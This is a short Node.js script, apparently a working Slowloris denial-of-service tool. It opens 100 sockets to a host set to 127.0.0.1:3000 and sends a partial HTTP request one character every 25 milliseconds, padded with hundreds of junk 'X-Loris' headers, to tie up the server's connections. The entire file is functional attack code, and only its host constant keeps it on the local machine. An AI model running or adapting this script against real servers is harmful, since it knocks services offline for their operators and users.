const net = require('net')
const client = new net.Socket()

const host = '127.0.0.1'
const port = 3000

const connections = 100
let lines = 500
let activeConnections = 0

slowlorisAttack()

function slowlorisAttack() {
  req = createRequest()

  for(let i = 0; i < connections; i++) {
    sendRequest(req)
  }
}

function createRequest() {
  let req = 'Host: ' + host + '\r\n' + 'Accept: */*\r\n'

  for(let i = 0; i < lines; i++) {
    req += 'X-Loris-' + i + ': ' + i + '\r\n'
  }

  req += '\r\n'

  return req
}

function sendRequest(req) {
   const connection = net.connect(port, host, function(){
    activeConnections++
    console.log('Started connection')
    console.log('Active connections: ' + activeConnections)

    connection.write('GET / HTTP/1.1\r\n')

    let i = 0;
    setInterval(function(){
      if (!req[i]) {
        return
      } else {
        connection.write(req[i])
        i++
      }
    }, 25)
  })

  connection.setTimeout(0)

  connection.on('error', () => {
    console.log('Closed connection')
    activeConnections--
  })
}
